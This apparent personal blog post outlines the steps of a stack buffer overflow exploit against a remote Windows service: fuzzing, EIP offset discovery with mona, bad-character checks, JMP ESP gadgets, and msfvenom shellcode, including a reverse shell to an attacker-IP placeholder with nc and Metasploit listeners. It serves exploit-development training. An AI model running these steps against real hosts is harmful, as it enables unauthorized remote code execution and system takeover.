---
title: "Buffer Overflow Outline"
layout: post
date: 2019-09-07 12:00
tag: 
- security
- python
headerImage: false
projects: false
hidden: false # don't count this post in blog pagination
description: "Notes on how to perform a buffer overflow, commands I frequently use, and general structure of the attack"
category: blog
author: tony
externalLink: false
---
# Disclaimer
This is for educational purposes - do not attack any host you do not own or have explicit permission to work on. You can/likely will face serious punishment. 

# BufferOverflow-Template
This is a set of notes I also have up on GitHub along with source files to help speed up the time it takes me to perform a buffer overflow:
https://github.com/tonydelanuez/BufferOverflow-Helper

(This guide assumes no DEP or ASLR enabled on the host)

## Files:
`fuzz.py`: Simple fuzzer in python to try and crash a program listening on a remote host by sending strings of variable length

`exploit.py`: PoC buffer overflow exploit script

## Exploit Steps:

### Fuzz
Trigger a stack overflow bug by identifying string input and fuzzing the program with different length strings. (See `fuzz.py`)

### Identify EIP
Identify the offset to the saved return pointer by using pattern_create.
`pattern_create.rb -l <Buffer Size>`, substitute the buffer into exploit.py and
trigger another crash. Use `!mona findmsp` to observe ESP and EIP. EIP will point to the address to overrwrite (say, Crash EIP).

### Control EIP
`pattern_offset.rb -l <Buffer Size> -q <Crash EIP>`
This will return the offset at which to place your saved return pointer. You've now got control of EIP.

### Check for bad characters in ESP
Set mona working directory: 
`!mona config -set workingfolder c:\mona\%p`

Create a buffer of all characters to send in ESP, generate this with mona: 
`!mona bytearray -cpb <Possible Bad Characters>`

Run the exploit. 
Compare characters in ESP with mona:

`!mona compare -a esp -f c:\mona\bytearray.bin`

Mona will suggest possible bad characters

### Find a JMP ESP gadget
Use mona to find a gadget such as JMP ESP in the binary that will let us fill EIP with a jump to our malicious code that doesn't contain bad characters:
(Example, bad characters are x00\x09)

`!mona jmp -r esp -cbp "\x00\x09"`
Make sure to reverse this address for little endian machines (x86):
0xDEADBEEF -> \xEF\xBE\xAD\xDE

### Test your JMP
Using your exploit string, jump to a breakpoint in order to not crash the program but verify your jump gadget is working as intended: 

`buf += "A" * offset_return_pointer`
`buf += jmp_esp_gadget`
`buf += "\xCC\xCC\xCC\xCC"`
`buf += "D" * (total_buffer_length - len(buf))`
`buf += "\n"`

This exploit string should trigger a breakpoint if you've successfully jumped to ESP.

### Generate shellcode and give yourself some room
Use Metasploit's metasm_shell.rb (/usr/share/metasploit-framework/tools/exploit/metasm_shell.rb in Kali) to move ESP up the stack and away from shellcode.

`metasm > sub esp,0x10`
`"\x83\xec\x10"`

Place this after your jmp_esp gadget (no need to reverse, this is an instruction).

Generate some shellcode with msfvenom to trigger calc:
`msfvenom -p windows/exec -b <BAD CHARACTERS> -f python --var-name calc_pop CMD=calc.exe EXITFUNC=thread`

When thrown into your exploit, the shellcode generated from the above command should open calc.exe.

Generate some shellcode for a reverse shell:
`msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b <BAD CHARACTERS> -f python --var-name rev_shell EXITFUNC=thread`

Set up a listener with nc or metasploits multi/handler: 
`nc -nvlp <ATTACKER_PORT>`

`msfconsole`
`> use exploit multi/handler`
`> payload windows/meterpreter/reverse_tcp`
`> set lhost <ATTACKER IP>`
`> set lport <ATTACKER PORT>`
`> exploit -j`

